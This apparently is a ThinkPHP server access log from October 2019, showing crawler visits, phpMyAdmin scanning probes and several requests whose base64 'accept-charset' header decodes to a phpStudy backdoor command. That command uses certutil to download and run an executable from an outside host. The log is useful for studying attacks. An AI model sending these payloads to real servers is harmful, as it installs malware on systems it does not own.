+[运行时间：0.042542s] [吞吐率：23.51req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T13:53:54+08:00] 207.46.13.88 GET www.aizhuanbao.cn/
+[运行时间：0.030142s] [吞吐率：33.18req/s] [内存消耗：2,211.73kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'www.aizhuanbao.cn',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T13:57:56+08:00] 103.228.209.128 POST 123.57.56.8/app/api.php
+[运行时间：0.039986s] [吞吐率：25.01req/s] [内存消耗：1,970.93kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T13:59:52+08:00] 37.49.207.235 GET 123.57.56.8:80/
+[运行时间：0.032187s] [吞吐率：31.07req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T14:42:28+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
+[运行时间：0.523018s] [吞吐率：1.91req/s] [内存消耗：1,971.41kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T15:04:06+08:00] 80.87.144.158 GET 123.57.56.8:80/
+[运行时间：0.132984s] [吞吐率：7.52req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T16:35:54+08:00] 34.219.30.210 GET maxthink.cn/
+[运行时间：0.031507s] [吞吐率：31.74req/s] [内存消耗：2,210.33kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Go-http-client/1.1',
+  'host' => 'maxthink.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T16:38:17+08:00] 125.65.202.169 POST 123.57.56.8/app/api.php
+[运行时间：0.033185s] [吞吐率：30.13req/s] [内存消耗：1,970.93kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T17:54:58+08:00] 183.129.160.229 GET 123.57.56.8:80/
+[运行时间：0.029479s] [吞吐率：33.92req/s] [内存消耗：2,210.79kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '123.57.56.8:80',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T18:15:20+08:00] 88.28.222.141 GET 123.57.56.8/phpmyadmin/
+[运行时间：0.028373s] [吞吐率：35.24req/s] [内存消耗：1,971.51kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T18:15:41+08:00] 58.250.125.189 GET www.aizhuanbao.cn/
+[运行时间：0.031413s] [吞吐率：31.83req/s] [内存消耗：2,211.13kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'host' => 'www.aizhuanbao.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T18:38:00+08:00] 103.79.156.8 GET 123.57.56.8:80/
+[运行时间：0.033864s] [吞吐率：29.53req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T18:45:35+08:00] 101.254.150.102 GET 123.57.56.8/root11.php
+[运行时间：0.030396s] [吞吐率：32.90req/s] [内存消耗：1,971.54kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T19:21:28+08:00] 139.162.88.63 GET clientapi.ipip.net/echo.php?info=1234567890
+[运行时间：0.028358s] [吞吐率：35.26req/s] [内存消耗：1,971.71kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T19:25:15+08:00] 47.111.159.34 GET 123.57.56.8/
+[运行时间：0.036501s] [吞吐率：27.40req/s] [内存消耗：2,212.73kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.57.56.8',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://123.57.56.8:80',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmt5LmRmZzQ1ZGZnNDUuYmVzdC9kb3dubG9hZC5leGUgJVN5c3RlbVJvb3QlL1RlbXAvaXdhYmdhb3N4ZGtnZWlnNjc4LmV4ZSAmICVTeXN0ZW1Sb290JS9UZW1wL2l3YWJnYW9zeGRrZ2VpZzY3OC5leGUnKTtlY2hvIG1kNSgncGhwc3R1ZHknKTs=',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T19:25:15+08:00] 47.111.159.34 GET 123.57.56.8/index.php
+[运行时间：0.032097s] [吞吐率：31.16req/s] [内存消耗：2,212.87kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.57.56.8',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://123.57.56.8:80/index.php',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmt5LmRmZzQ1ZGZnNDUuYmVzdC9kb3dubG9hZC5leGUgJVN5c3RlbVJvb3QlL1RlbXAvaXdhYmdhb3N4ZGtnZWlnNjc4LmV4ZSAmICVTeXN0ZW1Sb290JS9UZW1wL2l3YWJnYW9zeGRrZ2VpZzY3OC5leGUnKTtlY2hvIG1kNSgncGhwc3R1ZHknKTs=',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T19:34:54+08:00] 41.60.245.37 GET 123.57.56.8/w00tw00t.at.blackhats.romanian.anti-sec:)
+[运行时间：0.026595s] [吞吐率：37.60req/s] [内存消耗：1,971.63kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T19:34:55+08:00] 41.60.245.37 GET 123.57.56.8/phpMyAdmin/scripts/setup.php
+[运行时间：0.029317s] [吞吐率：34.11req/s] [内存消耗：1,971.60kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T19:34:56+08:00] 41.60.245.37 GET 123.57.56.8/phpmyadmin/scripts/setup.php
+[运行时间：0.028216s] [吞吐率：35.44req/s] [内存消耗：1,971.60kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T19:34:56+08:00] 41.60.245.37 GET 123.57.56.8/pma/scripts/setup.php
+[运行时间：0.027973s] [吞吐率：35.75req/s] [内存消耗：1,971.59kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T19:34:58+08:00] 41.60.245.37 GET 123.57.56.8/myadmin/scripts/setup.php
+[运行时间：0.028514s] [吞吐率：35.07req/s] [内存消耗：1,971.60kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T19:34:59+08:00] 41.60.245.37 GET 123.57.56.8/MyAdmin/scripts/setup.php
+[运行时间：0.027006s] [吞吐率：37.03req/s] [内存消耗：1,971.60kb] [文件加载：125]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[2019-10-06T19:36:43+08:00] 47.101.141.40 GET www.aizhuanbao.cn/
+[运行时间：0.029724s] [吞吐率：33.64req/s] [内存消耗：2,210.76kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.aizhuanbao.cn',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T19:39:24+08:00] 185.26.232.200 GET 123.57.56.8:80/
+[运行时间：0.032905s] [吞吐率：30.39req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T21:12:24+08:00] 111.224.248.42 GET www.maxthink.cn/
+[运行时间：0.041067s] [吞吐率：24.35req/s] [内存消耗：2,210.74kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'deflate, gzip',
+  'accept' => '*/*',
+  'host' => 'www.maxthink.cn',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T21:49:30+08:00] 155.133.0.54 GET 123.57.56.8:80/
+[运行时间：0.031061s] [吞吐率：32.19req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T22:31:18+08:00] 5.234.239.229 GET 123.57.56.8:80/
+[运行时间：0.030859s] [吞吐率：32.41req/s] [内存消耗：2,210.70kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '123.57.56.8:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T23:19:54+08:00] 123.57.19.53 GET 123.57.56.8/
+[运行时间：0.033918s] [吞吐率：29.48req/s] [内存消耗：2,212.73kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.57.56.8',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://123.57.56.8:80',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmt5LmRmZzQ1ZGZnNDUuYmVzdC9kb3dubG9hZC5leGUgJVN5c3RlbVJvb3QlL1RlbXAvbmFvY3Fya2tsYWJjcXJmMjgyODkuZXhlICYgJVN5c3RlbVJvb3QlL1RlbXAvbmFvY3Fya2tsYWJjcXJmMjgyODkuZXhlJyk7ZWNobyBtZDUoJ3BocHN0dWR5Jyk7',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T23:19:54+08:00] 123.57.19.53 GET 123.57.56.8/index.php
+[运行时间：0.029842s] [吞吐率：33.51req/s] [内存消耗：2,212.87kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.57.56.8',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://123.57.56.8:80/index.php',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmt5LmRmZzQ1ZGZnNDUuYmVzdC9kb3dubG9hZC5leGUgJVN5c3RlbVJvb3QlL1RlbXAvbmFvY3Fya2tsYWJjcXJmMjgyODkuZXhlICYgJVN5c3RlbVJvb3QlL1RlbXAvbmFvY3Fya2tsYWJjcXJmMjgyODkuZXhlJyk7ZWNobyBtZDUoJ3BocHN0dWR5Jyk7',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T23:43:45+08:00] 123.57.172.221 GET 123.57.56.8/
+[运行时间：0.030462s] [吞吐率：32.83req/s] [内存消耗：2,212.73kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.57.56.8',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://123.57.56.8:80',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vNjAuMTY0LjI1MC4xNzA6Mzg4OC9kb3dubG9hZC5leGUgJVN5c3RlbVJvb3QlL1RlbXAvbnd4d2hnZG94YW1sdnRkMTgzOTguZXhlICYgJVN5c3RlbVJvb3QlL1RlbXAvbnd4d2hnZG94YW1sdnRkMTgzOTguZXhlJyk7ZWNobyBtZDUoJ3BocHN0dWR5Jyk7',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
+---------------------------------------------------------------
+[2019-10-06T23:43:45+08:00] 123.57.172.221 GET 123.57.56.8/index.php
+[运行时间：0.030450s] [吞吐率：32.84req/s] [内存消耗：2,212.87kb] [文件加载：131]
+[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.57.56.8',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://123.57.56.8:80/index.php',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vNjAuMTY0LjI1MC4xNzA6Mzg4OC9kb3dubG9hZC5leGUgJVN5c3RlbVJvb3QlL1RlbXAvbnd4d2hnZG94YW1sdnRkMTgzOTguZXhlICYgJVN5c3RlbVJvb3QlL1RlbXAvbnd4d2hnZG94YW1sdnRkMTgzOTguZXhlJyk7ZWNobyBtZDUoJ3BocHN0dWR5Jyk7',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
+) ]
